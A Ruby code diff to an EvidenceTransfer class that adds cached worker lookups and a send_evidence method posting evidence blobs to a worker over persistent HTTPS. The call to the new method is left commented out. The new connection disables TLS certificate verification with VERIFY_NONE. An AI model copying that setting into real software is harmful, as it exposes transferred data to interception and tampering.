@@ -24,6 +24,8 @@ class EvidenceTransfer
   include RCS::Tracer
 
   def start
+    @workers = {}
+    @http = {}
     @threads = Hash.new
     @worker = Thread.new { self.work }
   end
@@ -115,6 +117,13 @@ class EvidenceTransfer
     evidence = EvidenceManager.instance.get_evidence(id, instance)
     raise "evidence to be transferred is nil" if evidence.nil?
 
+=begin
+    address = get_worker_address(instance)
+    raise "invalid worker address" unless address
+
+    ret, error, action = send_evidence(address, instance, evidence)
+=end
+
     # send and delete the evidence
     ret, error, action = DB.instance.send_evidence(instance, evidence)
 
@@ -128,7 +137,45 @@ class EvidenceTransfer
       trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
       EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     end
-    
+  end
+
+  def get_worker_address(instance)
+    return @workers[instance] if @workers[instance]
+
+    address = DB.instance.get_worker(instance)
+    trace :info, "Worker address for #{instance} is #{address}"
+
+    @workers[instance] = address
+  end
+
+  def send_evidence(address, instance, evidence)
+
+    host, port = address.split(':')
+
+    http = @http[address] || (@http[address] = PersistentHTTP.new(
+                  :name         => 'PersistentToWorker' + address,
+                  :pool_size    => 20,
+                  :host         => host,
+                  :port         => port,
+                  :use_ssl      => true,
+                  :verify_mode  => OpenSSL::SSL::VERIFY_NONE
+                ))
+
+    full_headers = {'Connection' => 'Keep-Alive' }
+    request = Net::HTTP::Post.new("/evidence/#{instance}", full_headers)
+    request.body = evidence
+    ret = http.request(request)
+
+    case ret
+      when Net::HTTPSuccess then return true, "OK", :delete
+      when Net::HTTPConflict then return false, "empty evidence", :delete
+    end
+
+    return false, ret.body
+  rescue Exception => e
+    trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
+    trace :fatal, e.backtrace
+    raise
   end
 
 end
